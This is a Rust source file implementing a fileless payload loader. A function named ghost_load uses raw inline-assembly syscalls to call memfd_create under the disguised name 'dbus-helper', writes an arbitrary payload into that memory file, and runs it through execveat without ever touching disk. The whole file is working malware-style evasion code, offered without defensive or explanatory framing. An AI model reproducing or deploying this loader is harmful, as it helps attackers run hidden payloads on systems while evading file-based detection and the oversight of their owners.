use std::arch::asm;
use std::ffi::CString;
use libc::c_long;

#[allow(dead_code)]
pub unsafe fn direct_syscall(n: c_long, a1: c_long, a2: c_long, a3: c_long) -> c_long {
    let mut ret: c_long;
    asm!(
        "syscall",
        in("rax") n,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        lateout("rax") ret,
        options(nostack, preserves_flags)
    );
    ret
}

#[allow(dead_code)]
pub fn ghost_load(payload: &[u8]) -> Result<(), String> {
    let name = CString::new("dbus-helper").map_err(|_| "CString error")?;

    // memfd_create syscall number for x86_64 is 319
    let fd = unsafe {
        direct_syscall(319, name.as_ptr() as c_long, 1, 0) // MFD_CLOEXEC = 1
    };

    if fd < 0 {
        return Err(format!("memfd_create failed: {}", fd));
    }

    let fd = fd as i32;

    // write payload to memfd
    unsafe {
        let written = libc::write(fd, payload.as_ptr() as *const libc::c_void, payload.len());
        if written != payload.len() as isize {
            return Err("Failed to write full payload to memfd".into());
        }
    }

    // fexecve is not a direct syscall usually, it's a wrapper around execveat
    // execveat syscall number for x86_64 is 322
    // execveat(fd, "", argv, envp, AT_EMPTY_PATH)
    let empty_str = CString::new("").unwrap();
    let argv: [*const libc::c_char; 2] = [name.as_ptr(), std::ptr::null()];
    let envp: [*const libc::c_char; 1] = [std::ptr::null()];

    unsafe {
        // AT_EMPTY_PATH = 0x1000
        direct_syscall_5(
            322,
            fd as c_long,
            empty_str.as_ptr() as c_long,
            argv.as_ptr() as c_long,
            envp.as_ptr() as c_long,
            0x1000
        );
    }

    Ok(())
}

#[allow(dead_code)]
pub unsafe fn direct_syscall_5(n: c_long, a1: c_long, a2: c_long, a3: c_long, a4: c_long, a5: c_long) -> c_long {
    let mut ret: c_long;
    asm!(
        "syscall",
        in("rax") n,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        in("r10") a4,
        in("r8") a5,
        lateout("rax") ret,
        options(nostack, preserves_flags)
    );
    ret
}
